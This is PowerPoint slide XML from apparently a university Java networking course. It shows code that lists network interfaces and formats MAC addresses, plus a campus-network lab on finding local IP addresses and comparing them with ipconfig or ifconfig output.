                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>out</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078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>println</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50A14F"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"  IP: "</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4078F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err="1">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>addr</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078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getHostAddress</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err="1">
                <a:solidFill>
                  <a:srgbClr val="B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>out</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078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>println</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50A14F"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"-----------------------"</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>catch</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>SocketException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> e</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err="1">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>e</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078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printStackTrace</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>private</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>static</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>String</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err="1">
                <a:solidFill>
                  <a:srgbClr val="4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>formatMAC</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>byte</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mac</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</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mac </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4078F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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>null</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</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50A14F"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"N/A"</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>StringBuilder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> sb </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4078F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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>new</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>StringBuilder</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>byte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> b </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4078F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mac</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err="1">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sb</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078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>append</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>String</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078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>format</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50A14F"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"%02X:"</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b</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sb</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078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>length</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4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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err="1">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sb</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078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>deleteCharAt</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sb</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078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="383A4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4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-</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B76B01"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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A626A4"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</a:t>
            </a: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err="1">
                <a:solidFill>
                  <a:srgbClr val="494949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="383A42"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="4078F2"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>toString</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94949"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a: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a:p>
            <a:pPr lvl="0" latinLnBrk="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383A42"/>
                </a:solidFill>
                <a:latin typeface="Menlo"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>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35565" y="171453"/>
            <a:ext cx="10320867" cy="571500"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example: List the network interfaces on this machine</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61443" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="402166" y="685801"/>
            <a:ext cx="11387667" cy="762000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>the InterfaceList </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>class is:</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="604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319212"/>
            <a:ext cx="5943600" cy="5233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7925" y="1828800"/>
            <a:ext cx="5703358" cy="4343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r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Experiment: Identifying Local IP Addresses in a Campus Network</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62467" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="402167" y="1600200"/>
            <a:ext cx="11387667" cy="4876800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Find the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>of your host in the local area network (Shenzhen University campus network) . </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Compare the IP address(es) detected by your Java program with those shown in the system’s ipconfig (Windows) or ifconfig (Linux/macOS) output. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Test the program under different connection modes (wired/wireless) and analyze discrepancies.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>Think about it: When the local environment is complex, such as there are multiple network cards, one network interface is configured with multiple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IPs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>, etc., how to get the desired </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IP?</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN"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11430000" cy="5943600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t>Procedure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t>Run the Java Program</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Execute your "Find Local IP" program (using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>NetworkInterface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>) on Shenzhen University’s campus network.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t>Cross-Check with System Tools</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Compare the program’s output with the IP(s) listed in:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>ipconfig /all  # Windows</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>ifconfig       # Linux/macOS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t>Test Connection Modes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Run the program on both </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>wired (Ethernet)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>wireless (Wi-Fi)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> connections.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Observe if the results differ (e.g., different interfaces or IPs).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800"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167" y="304799"/>
            <a:ext cx="11485033" cy="6416675"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Critical Thinking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>: In complex network environments with:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>Multiple NICs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> (e.g., Ethernet + Wi-Fi + VPN),</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>Multi-IP Interfaces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> (e.g., one NIC with multiple IPs),</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>How to Programmatically Identify the "Desired" IP?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Consider these strategies:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Filter by Interface Type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>NetworkInterface.getNetworkInterfaces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>forEach</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>ni</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> -&gt; {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>    if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>ni.isUp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>() &amp;&amp; !</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>ni.isLoopback</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>() &amp;&amp; !</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>ni.isVirtual</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>()) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
